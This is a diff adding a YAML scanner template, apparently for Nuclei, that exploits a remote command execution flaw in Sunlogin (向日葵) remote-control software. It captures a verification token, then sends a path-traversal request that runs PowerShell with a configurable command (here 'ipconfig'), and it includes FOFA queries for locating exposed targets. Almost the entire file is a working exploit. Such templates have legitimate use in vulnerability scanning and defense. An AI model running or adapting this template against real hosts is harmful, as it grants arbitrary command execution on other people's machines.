@@ -1,0 +1,45 @@
+id: sunlogin_rce
+
+info:
+  name: 向日葵RCE
+  author: Xc1Ym
+  severity: critical
+  description: 通过该链接可以执行命令
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query1: body="Verification failure"
+    fofa-query2: app="向日葵-远程控制"
+  tags: rce,sunlogin,hw
+
+variables:
+  cmd: "ipconfig"
+
+http:
+    - raw:
+      - |
+        GET /cgi-bin/rpc?action=verify-haras HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+{{cmd}} HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: CID={{cid}}
+
+      extractors:
+        - type: json
+          part: body
+          internal: true
+          name: cid
+          json:
+          - '.verify_string'
+
+      matchers:
+        - type: dsl
+          dsl:
+            - "status_code_1==200"
+            - "contains(body_1, 'verify_string')"
+            - "status_code_2==200"
+            - "contains(body_2, 'Windows IP')"
+          condition: and
+# digest: 4a0a00473045022019b178a4c5fd8c1cb4113c2f34d2587e1bdc19c6f07284e1f542d9399b6d24b4022100e41c173cc9b11ccb125c213e9ba41312ff86c423680190403c54c356a0f864af:6b2dd5af372f02ed15a56faf8ad98cf9
